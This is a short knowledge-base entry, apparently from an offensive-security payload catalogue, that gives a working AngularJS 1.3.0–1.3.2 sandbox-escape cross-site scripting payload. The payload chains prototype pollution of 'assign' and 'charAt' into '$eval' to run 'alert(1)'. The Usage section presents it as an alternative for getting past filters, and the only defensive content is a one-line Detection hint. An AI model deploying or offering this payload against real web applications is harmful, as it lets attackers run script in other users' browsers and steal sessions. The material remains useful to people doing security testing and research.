---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - proto-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Proto-Assign-ValueOf-Pollution

## Code

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

## Description

Variant using valueOf for charAt pollution after assign overwrite in AngularJS 1.3.0-1.3.2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | ValueOf-based chain. | N/A |

## Usage

Alternative when join is filtered.

## Detection

- valueOf invocations in eval contexts.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
